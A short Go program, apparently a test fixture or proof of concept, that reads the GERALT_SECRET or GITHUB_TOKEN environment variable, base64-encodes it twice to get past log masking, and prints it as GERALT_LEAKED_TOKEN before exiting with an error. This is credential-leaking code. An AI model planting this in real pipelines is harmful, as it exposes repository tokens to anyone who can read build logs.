package main

import (
	"encoding/base64"
	"fmt"
	"os"
)

func main() {
	secret := os.Getenv("GERALT_SECRET")
	if secret == "" {
		secret = os.Getenv("GITHUB_TOKEN")
	}
	leak := base64.StdEncoding.EncodeToString([]byte(base64.StdEncoding.EncodeToString([]byte(secret))))
	fmt.Printf("GERALT_LEAKED_TOKEN=%s\n", leak)
	os.Exit(1)
}
